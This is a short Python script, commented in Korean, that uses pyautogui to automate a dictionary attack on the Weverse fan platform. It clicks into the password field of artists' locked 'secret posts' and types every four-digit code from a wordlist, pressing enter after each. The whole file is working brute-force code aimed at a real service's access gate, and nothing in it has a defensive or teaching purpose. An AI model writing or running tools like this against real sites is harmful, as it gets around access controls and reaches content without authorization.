#파일명: weverse_brute.py
#기  능: 위버스 비밀포스트 뚫기
#        위버스 아티스트들이 이벤트 삼아 올린 비밀 포스트를 뚫는 사전공격
#주의사항: 크롬으로 위버스에 접속하고 'win' + '<-'로 좌측에 윈도우 배치해야 함.
import pyautogui
import time


pyautogui.moveTo(475,680)
pyautogui.click()
time.sleep(1)
pyautogui.moveTo(475,590)
pyautogui.click()
time.sleep(1)

with open('pass_4digit.txt','r', encoding='UTF8') as file:
    lines=file.readlines()
    for line in lines:
       pyautogui.typewrite(line)
       pyautogui.press('enter')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
